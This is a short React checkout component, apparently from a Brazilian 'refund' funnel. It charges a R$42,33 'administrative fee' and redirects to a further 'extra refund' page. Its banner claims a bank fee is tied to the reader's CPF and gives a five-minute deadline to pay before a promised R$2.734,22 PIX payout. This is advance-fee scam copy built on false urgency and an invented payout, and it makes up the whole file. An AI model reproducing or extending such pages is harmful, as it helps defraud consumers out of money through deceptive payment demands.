import CheckoutPage from "@/components/checkout/CheckoutPage";

const Upsell1 = () => {
  return (
    <CheckoutPage
      productName="Taxa Administrativa"
      amountCents={4233}
      amountFormatted="42,33"
      redirectUrl="https://lightpink-tiger-937529.hostingersite.com/ressarcimento-extra/"
      bannerText={
        <>
          A sua <span className="font-bold">Tarifa Bancária</span> já está
          vinculada ao seu CPF. Você possui{" "}
          <span className="font-bold">5 minutos</span> para finalizar o
          pagamento, essa é a última etapa para você receber o seu valor de{" "}
          <span className="font-bold">R$2.734,22</span> na sua{" "}
          <span className="font-bold">CHAVE PIX</span> cadastrada.
        </>
      }
    />
  );
};

export default Upsell1;
